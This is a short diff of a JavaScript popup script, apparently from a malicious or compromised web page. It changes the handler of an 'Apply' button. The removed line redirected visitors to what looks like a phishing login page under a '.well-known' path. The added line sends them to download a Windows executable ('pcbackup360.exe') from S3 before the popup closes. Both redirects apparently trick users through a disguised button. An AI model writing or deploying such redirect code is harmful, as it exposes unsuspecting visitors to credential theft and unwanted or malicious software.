@@ -1240,6 +1240,6 @@ document.addEventListener("DOMContentLoaded", function() {
   
   function applyFunction() {
 	// Fonction à exécuter lors du clic sur le bouton "Appliquer"
-	window.location.href='http://prosodix.com/.well-known/92933/Login.html'
+	window.location.href='s3.amazonaws.com/app.pcbackup360.com/v2.0/installcapital/pcbackup360.exe'
 	closePopup();
 }
